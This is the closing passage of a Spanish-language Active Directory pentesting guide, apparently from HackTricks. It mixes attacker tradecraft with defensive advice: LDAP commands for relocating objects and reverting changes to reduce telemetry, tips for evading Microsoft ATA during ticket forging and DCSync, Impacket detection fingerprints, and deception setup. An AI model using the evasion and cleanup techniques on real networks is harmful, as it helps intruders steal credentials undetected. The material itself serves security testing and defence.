- `move-object` cambia el DN/OU de equipos o usuarios, lo que permite al atacante llevar los activos a una ubicación bajo permisos delegados antes de usar `set-password`, `add-groupmember` o `add-spn`. Consulta [Reubicación de OU y permisos heredados](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) para ver los permisos de movimiento y las comprobaciones de herencia.
- Los comandos de eliminación de alcance preciso (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permiten revertir rápidamente los cambios después de que el operador recopile credenciales o establezca persistencia, minimizando la telemetría.

## AD -> Azure y Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Obtén más información sobre cómo proteger las credenciales aquí.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteger las credenciales**

- **Restricciones para Domain Admins**: Se recomienda permitir que Domain Admins inicien sesión únicamente en Domain Controllers, y evitar que se usen en otros hosts.
- **Privilegios de cuentas de servicio**: Los servicios no deben ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Limitación temporal de privilegios**: Se debe limitar la duración de las tareas que requieren privilegios de DA. Esto puede lograrse con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigación de LDAP relay**: Audita los Event ID 2889/3074/3075 y luego aplica la firma LDAP y el channel binding de LDAPS en DCs/clientes para bloquear intentos de MITM/relay de LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Huella digital a nivel de protocolo de la actividad de Impacket

Si quieres detectar tradecraft habitual de AD, **no te bases únicamente en artefactos controlados por el operador**, como binarios renombrados, nombres de servicio, archivos batch temporales o rutas de salida. Establece una línea base de cómo los clientes legítimos de Windows generan tráfico de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC y WMI, y luego busca **particularidades de implementación** que persisten incluso después de que el operador edita `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Posibles indicadores independientes de alta confianza** (tras validarlos con tu propia línea base):
  - DCE/RPC autenticado que usa `auth_context_id = 79231 + ctx_id`
  - Relleno de autenticación de DCE/RPC con `0xff`
  - Enlaces Kerberos de LDAP que colocan un `AP-REQ` de Kerberos sin procesar directamente en `mechToken` de SPNEGO
  - Solicitudes de negociación SMB2/3 con valores de `ClientGuid` que parecen ASCII
  - `IWbemLevel1Login::NTLMLogin` de WMI que usa el espacio de nombres no estándar `//./root/cimv2`
  - Valores de nonce de Kerberos codificados de forma rígida
- **Mejor como características de correlación/puntuación**:
  - Listas de etype de Kerberos escasas o duplicadas, `PA-DATA` inusual/ausente u orden de etype en TGS-REQ distinto del de Windows nativo
  - Mensajes NTLM Type 1 sin información de versión o mensajes Type 3 con nombres de host nulos
  - NTLMSSP sin procesar transportado en DCE/RPC en lugar de SPNEGO, ausencia de trailers de verificación de DCE/RPC o discrepancias entre los OID de SPNEGO/Kerberos
  - Varias de estas características observadas en el mismo host/usuario/sesión/ventana temporal son mucho más sólidas que cualquier campo débil por sí solo
- **Úsalos como datos de enriquecimiento, no como alertas independientes**:
  - Nombres de archivo predeterminados, rutas de salida, nombres de servicio aleatorios, nombres de archivos batch temporales, nombres predeterminados de cuentas de equipo y cadenas HTTP/WebDAV/RDP/MSSQL específicas de herramientas
  - Los operadores pueden cambiarlos fácilmente; lo mejor es usarlos para explicar por qué un grupo de eventos entre protocolos resulta sospechoso
- **Notas operativas**:
  - Algunas de estas señales requieren tráfico descifrado, análisis de [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilidad del lado del servicio
  - Valida las señales con clientes Samba/Linux, dispositivos y software heredado antes de convertirlas en alertas
  - A medida que ganes confianza en la línea base, promueve las detecciones de enriquecimiento -> búsqueda -> alertas

### **Implementación de técnicas de deception**

- Implementar deception implica colocar trampas, como usuarios o equipos señuelo, con características como contraseñas que no caducan o que están marcadas como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o agregarlos a grupos con privilegios elevados.<sup>[[2]](#references)</sup>
- Un ejemplo práctico consiste en usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Encontrarás más información sobre cómo implementar técnicas de deception en [Deploy-Deception en GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificación de deception**

- **Para objetos de usuario**: Entre los indicadores sospechosos se incluyen un ObjectSID atípico, pocos inicios de sesión, fechas de creación y un recuento bajo de contraseñas incorrectas.
- **Indicadores generales**: Comparar los atributos de posibles objetos señuelo con los de objetos legítimos puede revelar incoherencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar este tipo de deception.

### **Cómo evadir los sistemas de detección**

- **Evasión de la detección de Microsoft ATA**:
  - **Enumeración de usuarios**: Evitar enumerar sesiones en Domain Controllers para impedir la detección de ATA.
  - **Suplantación de tickets**: Usar claves **aes** para crear tickets ayuda a evadir la detección al evitar bajar de nivel a NTLM.
  - **Ataques DCSync**: Se recomienda ejecutarlos desde un equipo que no sea Domain Controller para evitar la detección de ATA, ya que ejecutarlos directamente desde un Domain Controller activará alertas.

## References

- [1] [Guía para atacar las relaciones de confianza de dominio](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjar relaciones de confianza para deception en Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin a Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Colección LDAP BOF: kit de herramientas LDAP en memoria para explotar Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – ¡Holy Shuck! Uso de hashes NTLM como wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (laboratorio AD de NetExec) – Piratas](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Análisis de Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: toma de control de cuentas de Active Directory mediante Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Cómo gestionar los cambios en las conexiones de canal seguro de Netlogon asociados con CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un recorrido por las interfaces olvidadas de Null Session y MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [¿Filtro SID como límite de seguridad entre dominios? (Parte 4) - Investigación sobre cómo eludir el filtrado de SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [¿Filtro SID como límite de seguridad entre dominios? (Parte 5) - Ataque de confianza Golden GMSA: del dominio hijo al principal](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [¿Filtro SID como límite de seguridad entre dominios? (Parte 6) - Ataque de confianza mediante cambios en el esquema: del dominio hijo al principal](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA a EA con ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Cómo escalar de administradores de un dominio hijo a Enterprise Admins en 5 minutos abusando de AD CS: continuación](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un as bajo la manga: diseño de puertas traseras DACL de Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Código fuente del módulo pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atributo msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
